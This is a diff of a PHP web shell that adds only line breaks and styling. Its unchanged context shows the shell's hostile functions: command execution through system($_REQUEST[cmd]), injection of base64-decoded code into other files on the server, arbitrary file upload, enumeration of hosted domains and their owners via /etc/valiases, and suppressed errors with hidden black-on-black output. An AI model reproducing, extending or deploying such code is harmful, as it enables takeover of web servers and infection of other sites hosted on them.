@@ -418,7 +418,7 @@ error_reporting(0);
 						        </tr>";
 						    }
 						    echo '</table>
-						    </div>';
+						    </div><br><br><br>';
 						}
 						echo '
 						</BODY>
@@ -430,7 +430,8 @@ error_reporting(0);
 						?>
 					<body style="color: black; background-color: black;">
 					<font style="background-color: black; color: black;">
-					<?php phpinfo();}?>
+					<a style="color: black;">
+					<?php phpinfo(); echo '<br><br><br>';}?>
 					<?php 
 			?>
 			<?php
@@ -505,7 +506,7 @@ system ($_REQUEST[cmd]);
 								echo '<a style="color: red; font-family: cursive;" target="_blank" href="'.$files.'">'.$files.'</a><font size="" color="lawngreen" face="cursive">&nbsp;&nbsp;&nbsp&nbsp;Is Injected</font><br />';
 								$file_data = base64_decode($code1);
 								$file_data .= file_get_contents($files);
-								file_put_contents($files, $file_data);
+								file_put_contents($files, $file_data); echo '<br><br><br>';
 								} 
 							}
 						}
@@ -527,7 +528,7 @@ system ($_REQUEST[cmd]);
 				if ($files["name"] != '') {
 				    $fullpath = $_REQUEST["path"] . $files["name"];
 				    if (move_uploaded_file($files['tmp_name'], $fullpath)) {
-				        echo "<center><font style='color: red; font-family: cursive; font-size: 200%;'><a href='$fullpath' target='_blank'>Click to access uploaded File</a></font></center>";
+				        echo "<center><br><br><font style='color: red; font-family: cursive; font-size: 200%;'><a href='$fullpath' target='_blank'>Click to access uploaded File</a></font></center>";
 				    }
 				}
 				?>
@@ -582,7 +583,7 @@ system ($_REQUEST[cmd]);
 					<tr><td>No</td><td>Domain</td><td>User</td></tr>";
         			foreach ($domains as $domain) {
         			$user = posix_getpwuid(@fileowner("/etc/valiases/" . $domain));
-        			echo "<tr><td>".$count++."</td><td><a href='http://".$domain."' target='_blank'>".$domain."</a></td><td>".$user['name']."</td></tr>"; ?> </font> <?php
+        			echo "<tr><td>".$count++."</td><td><a href='http://".$domain."' target='_blank'>".$domain."</a></td><td>".$user['name']."</td></tr>"; ?> </font><br><br><br> <?php
      				}
 				}
 			} } }
